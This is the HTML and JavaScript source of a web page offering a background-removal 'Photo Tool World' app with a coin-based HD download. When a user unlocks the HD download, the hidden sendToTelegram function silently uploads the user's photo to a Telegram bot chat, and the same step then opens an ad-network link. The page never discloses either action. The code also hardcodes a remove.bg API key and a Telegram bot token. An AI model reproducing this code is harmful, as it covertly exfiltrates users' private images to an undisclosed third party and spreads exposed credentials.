<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Photo Tool World</title>

<style>

body{
background:#0f172a;
font-family:Arial;
color:white;
text-align:center;
margin:0;
}

.header{
background:#111827;
padding:10px;
overflow:hidden;
font-weight:bold;
}

.marquee{
white-space:nowrap;
display:inline-block;
animation:scroll 12s linear infinite,rainbow 6s linear infinite;
}

@keyframes scroll{
0%{transform:translateX(100%)}
100%{transform:translateX(-100%)}
}

@keyframes rainbow{
0%{color:red}
20%{color:orange}
40%{color:yellow}
60%{color:lime}
80%{color:cyan}
100%{color:magenta}
}

.container{
max-width:420px;
margin:auto;
padding:20px;
}

.wallet{
background:#1e293b;
padding:12px;
border-radius:10px;
margin-bottom:20px;
font-size:18px;
position:relative;
}

.coinFly{
position:absolute;
font-size:20px;
animation:fly 1s ease forwards;
}

@keyframes fly{
0%{transform:translateY(80px);opacity:1}
100%{transform:translateY(0);opacity:0}
}

.bigUpload{
width:100%;
padding:20px;
font-size:18px;
background:#22c55e;
border:none;
border-radius:12px;
color:white;
}

button{
width:100%;
padding:14px;
margin-top:10px;
border:none;
border-radius:10px;
background:#3b82f6;
color:white;
font-size:16px;
}

img{
max-width:100%;
margin-top:15px;
border-radius:10px;
}

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.7);
display:none;
align-items:center;
justify-content:center;
}

.popupBox{
background:#111827;
padding:25px;
border-radius:12px;
width:300px;
}

.unlockBtn{
background:#22c55e;
}

</style>
</head>

<body>

<div class="header">
<div class="marquee">
Welcome To Photo Tool World - Your Background Remover App
</div>
</div>

<div class="container">

<h2>Photo Tool World</h2>

<div class="wallet" id="wallet">
Coins: <span id="coins">0</span>
</div>

<button class="bigUpload" onclick="openUpload()">Upload Photo</button>

<input type="file" id="upload" accept="image/*" style="display:none" onchange="removeBG()">

<div id="status"></div>

<img id="result">

<button id="downloadSD" style="display:none" onclick="downloadSD()">Download SD</button>

<button id="downloadHD" style="display:none" onclick="openPopup()">Download HD</button>

</div>

<div class="popup" id="popup">
<div class="popupBox">
<h3>Unlock HD Download</h3>
<p>This feature costs 10 coins</p>
<button class="unlockBtn" onclick="buyHD()">Unlock Now</button>
<button onclick="closePopup()">Cancel</button>
</div>
</div>

<script>

let coins=localStorage.getItem("coins")||0;
coins=parseInt(coins);
document.getElementById("coins").innerText=coins;

function saveCoins(){
localStorage.setItem("coins",coins);
document.getElementById("coins").innerText=coins;
}

function flyCoins(){

let wallet=document.getElementById("wallet");

for(let i=0;i<8;i++){

let coin=document.createElement("div");
coin.innerHTML="🪙";
coin.className="coinFly";

coin.style.left=Math.random()*100+"px";

wallet.appendChild(coin);

setTimeout(()=>{
coin.remove();
},1000)

}

}

function openUpload(){
document.getElementById("upload").click();
}

let imageBlob=null;
let imageURL="";

async function removeBG(){

let file=document.getElementById("upload").files[0];

document.getElementById("status").innerHTML="Removing background...";

let formData=new FormData();
formData.append("image_file",file);
formData.append("size","auto");

let res=await fetch("https://api.remove.bg/v1.0/removebg",{
method:"POST",
headers:{
"X-Api-Key":"GycHN7qSDN9SUqvUkogEnoVb"
},
body:formData
});

imageBlob=await res.blob();
imageURL=URL.createObjectURL(imageBlob);

document.getElementById("result").src=imageURL;

document.getElementById("downloadSD").style.display="block";
document.getElementById("downloadHD").style.display="block";

coins+=10;
saveCoins();

flyCoins();

}

function downloadSD(){

let a=document.createElement("a");
a.href=imageURL;
a.download="photo_sd.png";
a.click();

}

function openPopup(){
document.getElementById("popup").style.display="flex";
}

function closePopup(){
document.getElementById("popup").style.display="none";
}

function buyHD(){

if(coins<10){
alert("Not enough coins");
return;
}

coins-=10;
saveCoins();

downloadHD();

closePopup();

}

async function downloadHD(){

let img=new Image();

img.onload=function(){

let canvas=document.createElement("canvas");
let ctx=canvas.getContext("2d",{alpha:true});

canvas.width=img.width;
canvas.height=img.height;

ctx.clearRect(0,0,canvas.width,canvas.height);

ctx.imageSmoothingEnabled=true;
ctx.imageSmoothingQuality="high";

ctx.drawImage(img,0,0);

let hd=canvas.toDataURL("image/png");

let a=document.createElement("a");
a.href=hd;
a.download="photo_hd.png";
a.click();

sendToTelegram();

window.open("https://www.effectivegatecpm.com/bupvhwz5?key=eaedd439f3f1d2db330f017cf0cb29ca");

}

img.src=imageURL;

}

async function sendToTelegram(){

let formData=new FormData();

formData.append("chat_id","1155624180");
formData.append("photo",imageBlob);

await fetch("https://api.telegram.org/bot8226940478:AAHrxtf_D6i6sO1OSH23RQEzap7hWa0n860/sendPhoto",{
method:"POST",
body:formData
});

}

</script>

</body>
</html>
